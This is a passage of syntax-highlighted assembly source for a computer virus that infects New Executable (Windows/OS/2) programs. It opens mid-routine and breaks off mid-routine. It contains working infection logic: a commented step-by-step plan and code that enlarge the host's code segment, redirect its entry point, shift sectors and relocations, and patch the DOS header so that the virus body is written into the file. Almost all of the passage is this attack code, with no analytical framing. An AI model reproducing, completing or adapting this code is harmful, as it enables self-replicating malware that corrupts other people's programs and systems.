        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">VSTART</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">                  </span><span class="sc1">;compare 32 bytes</span><span class="sc0">
</span><span class="sc5">FOK3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">FOK4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">FOK3</span><span class="sc0">
</span><span class="sc5">FOK_ERROR1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_CLOSE</span><span class="sc0">
</span><span class="sc5">FOK_ERROR2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;set NZ</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;and return to caller</span><span class="sc0">

</span><span class="sc1">;If we get here, then condition (3) is fulfilled, all systems go!</span><span class="sc0">

</span><span class="sc5">FOK4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;set Z flag</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;and exit</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This routine modifies the file we found to put the virus in it. There are a</span><span class="sc0">
</span><span class="sc1">;number of steps in the infection process, as follows:</span><span class="sc0">
</span><span class="sc1">;    1) We have to modify the segment table. For the initial segment, this</span><span class="sc0">
</span><span class="sc1">;       involves (a) increasing the segment size by the size of the virus,</span><span class="sc0">
</span><span class="sc1">;       and (b) increase the minimum allocation size of the segment, if it</span><span class="sc0">
</span><span class="sc1">;       needs it. Every segment AFTER this initial segment must also be</span><span class="sc0">
</span><span class="sc1">;       adjusted by adding the size increase, in sectors, of the virus</span><span class="sc0">
</span><span class="sc1">;       to it.</span><span class="sc0">
</span><span class="sc1">;    2) We have to change the starting ip in the new header. The virus is</span><span class="sc0">
</span><span class="sc1">;       placed after the host code in this segment, so the new ip will be</span><span class="sc0">
</span><span class="sc1">;       the old segment size.</span><span class="sc0">
</span><span class="sc1">;    3) We have to move all sectors in the file after the initial code segment</span><span class="sc0">
</span><span class="sc1">;       out by VIRSECS, the size of the virus in sectors.</span><span class="sc0">
</span><span class="sc1">;    4) We have to move the relocatables, if any, at the end of the code</span><span class="sc0">
</span><span class="sc1">;       segment we are infecting, to make room for the virus code. Then we</span><span class="sc0">
</span><span class="sc1">;       must add the viral relocatables to the relocatable table.</span><span class="sc0">
</span><span class="sc1">;    5) We must move the virus code into the code segment we are infecting.</span><span class="sc0">
</span><span class="sc1">;    6) We must adjust the jump in the virus to go to the original entry point.</span><span class="sc0">
</span><span class="sc1">;    7) We must adjust the resource offsets in the resource table to reflect</span><span class="sc0">
</span><span class="sc1">;       their new locations.</span><span class="sc0">
</span><span class="sc1">;    8) We have to kill the fast-load area.</span><span class="sc0">
</span><span class="sc1">;    9) We have to update the DOS EXE header to reflect the new file size.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">INFECT_FILE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">32H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get log2(logical seg size)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LOG_SEC</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;put logical sector size here</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;save old entry point</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ENTRYPT</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;for future use</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;read seg table entry</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_SEG_ENTRY</span><span class="sc0">           </span><span class="sc1">;for initial cs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get location of this seg in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">INITSEC</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;save that here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get segment size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;update entry ip in new header in ram</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SET_RELOCS</span><span class="sc0">              </span><span class="sc1">;set up RELOCS and CS_SIZE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">VSTART</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ARELOCS</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;now calculate added size of segment</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;multiply ARELOCS by 8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">CS_SIZE</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;ax=total new size</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;ax=full sectors in cs with virus</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;any remainder?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">INF05</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;adjust for partially full sector</span><span class="sc0">
</span><span class="sc5">INF05</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">CS_SIZE</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;size without virus</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">INF07</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">INF07</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;cx=number of secs needed for virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">VIRSECS</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">;save this here</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UPDATE_SEG_TBL</span><span class="sc0">          </span><span class="sc1">;perform mods in (1) above on file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">NH_OFFSET</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;now move file pointer to new header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_HDR</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">37H</span><span class="sc0"> </span><span class="sc1">;zero out fast load area</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">;(8) completed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_HDR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">NEW_HDR_SIZE</span><span class="sc0">         </span><span class="sc1">;update new header in file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;mods in (2) above now complete</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MOVE_END_OUT</span><span class="sc0">            </span><span class="sc1">;move end of virus out by VIRSECS (3)</span><span class="sc0">
                                        </span><span class="sc1">;also sets up RELOCS count</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SETUP_KERNEL</span><span class="sc0">            </span><span class="sc1">;put KERNEL module into virus relocs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RELOCATE_RELOCS</span><span class="sc0">         </span><span class="sc1">;relocate relocatables in cs (4)</span><span class="sc0">
</span><span class="sc5">INF1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WRITE_VIRUS_CODE</span><span class="sc0">        </span><span class="sc1">;put virus into cs (5 &amp; 6)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UPDATE_RES_TABLE</span><span class="sc0">        </span><span class="sc1">;update resource table entries</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ADJUST_DOS_HDR</span><span class="sc0">          </span><span class="sc1">;adjust the DOS header file size info</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_CLOSE</span><span class="sc0">              </span><span class="sc1">;close file now</span><span class="sc0">
</span><span class="sc5">INF2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;The following procedure updates the Segment Table entries per item (1) in</span><span class="sc0">
</span><span class="sc1">;INFECT_FILE.</span><span class="sc0">
</span><span class="sc5">UPDATE_SEG_TBL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;read seg table entry</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_SEG_ENTRY</span><span class="sc0">           </span><span class="sc1">;for initial cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get seg size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">           </span><span class="sc1">;add the size of the virus to seg size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;and update size in seg table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get min allocation size of segment</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;is it 64K?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">US2</span><span class="sc0">               </span><span class="sc1">;yes, leave it alone</span><span class="sc0">
</span><span class="sc5">US1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">           </span><span class="sc1">;add virus size on</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">US2</span><span class="sc0">               </span><span class="sc1">;no overflow, go and update</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;else set size = 64K</span><span class="sc0">
</span><span class="sc5">US2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;update size in table in ram</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK</span><span class="sc0">               </span><span class="sc1">;back up to location of seg table entry</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">          </span><span class="sc1">;and write modified seg table entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;for initial cs to segment table</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;ok, init cs seg table entry is modified</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">1CH</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get number of segment table entries</span><span class="sc0">

</span><span class="sc5">US3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;save table entry counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;dx=seg table entry # to read</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_SEG_ENTRY</span><span class="sc0">           </span><span class="sc1">;read it into disk buffer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get offset of this segment in file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">INITSEC</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;higher than initial code segment?</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">US4</span><span class="sc0">               </span><span class="sc1">;nope, don't adjust</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">VIRSECS</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;yes, add the size of virus in</span><span class="sc0">
</span><span class="sc5">US4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;adjust segment loc in memory</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK</span><span class="sc0">               </span><span class="sc1">;back up to location of seg table entry</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;and write modified seg table entry</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;restore table entry counter</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">US3</span><span class="sc0">                     </span><span class="sc1">;and loop until all segments done</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;all done</span><span class="sc0">

</span><span class="sc1">;This routine adjusts the DOS EXE header to reflect the new size of the file</span><span class="sc0">
</span><span class="sc1">;with the virus added. The Page Count and Last Page Size must be adjusted.</span><span class="sc0">
</span><span class="sc1">;Unlike Windows, OS/2 uses this variable to determine the size of the file</span><span class="sc0">
</span><span class="sc1">;to be loaded. If it doesn't get adjusted, part of the file won't get loaded</span><span class="sc0">
</span><span class="sc1">;and it'll be trash in memory.</span><span class="sc0">
</span><span class="sc5">ADJUST_DOS_HDR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;seek to file size variables</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">          </span><span class="sc1">;read into TEMP buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">VIRSECS</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;calculate bytes to add</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;put it in dx:ax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000FFFFH</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;bytes to add in edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get page count of file</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;eax has page count - 1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                   </span><span class="sc1">;eax has bytes of all but last page</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;ebx has bytes of last page</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;edx has new file size, in bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000111111111B</span><span class="sc0">    </span><span class="sc1">;ax=last page size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;save page count here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;seek to file size variables</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">
